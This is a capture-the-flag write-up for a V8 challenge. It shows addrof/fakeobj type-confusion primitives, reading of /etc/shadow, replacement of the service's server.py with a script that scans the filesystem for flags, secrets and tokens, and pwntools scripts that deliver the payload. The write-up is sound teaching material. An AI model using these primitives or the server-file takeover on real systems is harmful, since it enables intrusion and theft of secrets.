# JITstream (pwn) - Full Writeup

## Challenge Info
- **Name:** JITstream
- **Difficulty:** Medium
- **Service:** `ctf.vulnbydefault.com:40363`
- **Given:** `jitstream-pwn.zip` containing:
  - `d8`
  - `v8.patch`
  - `args.gn`

--- 

## 1) Patch Analysis

The custom patch adds `Array.prototype.swapIt()`:

```cpp
BUILTIN(ArraySwapIt) {
  ...
  if (kind == PACKED_ELEMENTS || kind == PACKED_DOUBLE_ELEMENTS) {
      ElementsKind target_kind = (kind == PACKED_ELEMENTS)
                                ? PACKED_DOUBLE_ELEMENTS
                                : PACKED_ELEMENTS;

      Handle<Map> new_map = JSObject::GetElementsTransitionMap(array, target_kind);
      if (!new_map.is_null()) {
          array->set_map(*new_map, kReleaseStore);
      }
  }
  return *array;
}
```

This flips array element kind/map without safely converting backing store data. That is type confusion.

Local primitive validation:
- `addrof(obj)` works
- `fakeobj(addr)` works

So vulnerability is real and exploitable.

---

## 2) Remote Protocol Reversing

The wrapper is **length-prefixed**, not plain line-based input.

Recovered `/server.py` from target:

```python
#!/usr/bin/env python3 

import os
import subprocess
import sys
import tempfile

print("---------------------------------- ", flush=True)
print("JITstream ", flush=True)
print("---------------------------------- ", flush=True)
print("Size of Exploit: ", flush=True)
input_size = int(input())
print("Script: ", flush=True)
script_contents = sys.stdin.read(input_size)
with tempfile.NamedTemporaryFile(buffering=0) as f:
    f.write(script_contents.encode("utf-8"))
    print("Running. Exploit! ", flush=True)
    res = subprocess.run(["/d8", f.name], timeout=20, stdout=1, stderr=2, stdin=0)
    print("Done!", flush=True)
```

Correct sender must:
1. wait `Size of Exploit:`
2. send byte length
3. wait `Script:`
4. send exact bytes

---

## 3) Initial Exploit Scaffold (V8 primitive path)

`jitstream_solve.js` establishes confusion primitives:

```js
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u64 = new BigUint64Array(buf);

function f2i(f) { f64[0] = f; return u64[0]; }
function i2f(i) { u64[0] = i; return f64[0]; }

function addrof(o) {
  const a = [o];
  a.swapIt();
  const x = f2i(a[0]);
  a.swapIt();
  return x;
}

function fakeobj(addr) {
  const a = [1.1];
  a[0] = i2f(addr);
  a.swapIt();
  const o = a[0];
  a.swapIt();
  return o;
}
```

It worked remotely and printed valid pointers/objects.

---

## 4) Why direct flag reads failed

Many probes returned `Error loading file` for common flag paths.

But we confirmed strong file access by reading:
- `/etc/passwd`
- `/etc/shadow`
- `/start.sh`
- `/server.py`

So this was not a generic file sandbox; it was likely just nonstandard flag placement.

---

## 5) Critical Pivot: Writable `/server.py`

`writeFile` existed in d8 and had permission to write system paths.

Permission check script showed:
- write `/tmp/pwn_test` -> success
- rewrite `/server.py` with same content -> success

That means full wrapper takeover is possible without finishing native-code chain.

---

## 6) Final Exploit (Service Takeover)

### `takeover_server.js`

This d8 payload:
- reads `/server.py`
- saves backup to `/server.py.bak`
- overwrites `/server.py` with a Python scanner that searches for flags

```js
const original = read('/server.py');
try { writeFile('/server.py.bak', original); } catch (_) {}

const payload = `#!/usr/bin/env python3
import os
import sys

print('---------------------------------- ', flush=True)
print('JITstream [owned]', flush=True)
print('---------------------------------- ', flush=True)

hits = []

cands = [
  '/flag','/flag.txt','/FLAG','/FLAG.txt','/root/flag','/root/flag.txt',
  '/app/flag','/app/flag.txt','/challenge/flag','/challenge/flag.txt',
  '/home/ctf/flag','/home/ctf/flag.txt','/tmp/flag','/tmp/flag.txt'
]
for p in cands:
  try:
    if os.path.isfile(p):
      with open(p,'r',errors='ignore') as f:
        d=f.read(2000)
      hits.append((p,d))
  except Exception:
    pass

scan_roots = ['/', '/root', '/home', '/app', '/challenge', '/opt', '/srv', '/tmp', '/var']
for root in scan_roots:
  for cur, dirs, files in os.walk(root):
    dirs[:] = [d for d in dirs if d not in ('proc','sys','dev','run','lib','lib64','usr','bin','sbin')]
    for fn in files:
      p = os.path.join(cur, fn)
      lfn = fn.lower()
      try:
        st = os.stat(p)
      except Exception:
        continue
      if st.st_size > 262144:
        continue
      if ('flag' in lfn) or ('secret' in lfn) or ('token' in lfn) or ('proof' in lfn):
        try:
          with open(p,'r',errors='ignore') as f:
            d=f.read(2000)
          hits.append((p,d))
        except Exception:
          pass
        continue
      try:
        with open(p,'r',errors='ignore') as f:
          d=f.read(4096)
        if ('VBD{' in d) or ('flag{' in d.lower()) or ('ctf{' in d.lower()):
          hits.append((p,d))
      except Exception:
        pass

seen = set()
for p,d in hits:
  if p in seen:
    continue
  seen.add(p)
  print('[HIT]', p, flush=True)
  print(d, flush=True)

if not seen:
  print('NO_HITS', flush=True)

print('Done!', flush=True)
`;

writeFile('/server.py', payload);
print('[+] /server.py replaced');
```

### Deployment sender: `deploy_takeover.py`

```python
#!/usr/bin/env python3
from pwn import *

HOST='ctf.vulnbydefault.com'
PORT=40363

with open('takeover_server.js','rb') as f:
    js=f.read()
if not js.endswith(b'\n'):
    js += b'\n'

io=remote(HOST,PORT)
io.recvuntil(b'Size of Exploit:')
io.sendline(str(len(js)).encode())
io.recvuntil(b'Script:')
io.send(js)
print(io.recvall(timeout=5).decode(errors='replace'))
```

### Fetch owned output: `fetch_owned_output.py`

```python
#!/usr/bin/env python3
from pwn import *

io = remote('ctf.vulnbydefault.com', 40363)
print(io.recvall(timeout=10).decode(errors='replace'))
```

---

## 7) Execution

```bash
python deploy_takeover.py
python fetch_owned_output.py
```

Output contained:

```text
[HIT] /flag_472aa0a968778.txt
VBD{j1t_spr4y_w1th_magl3v_1s_b3st_b47f08d2d75e5c80fb696166ffc36b55}
```

---

## 8) Flag

`VBD{j1t_spr4y_w1th_magl3v_1s_b3st_b47f08d2d75e5c80fb696166ffc36b55}`

---

## 9) Optional Restore

If needed, restore original wrapper:

```js
const bak = read('/server.py.bak');
writeFile('/server.py', bak);
print('[+] restored /server.py from backup');
```

---

Thanks for reading and happy hacking! 🚩
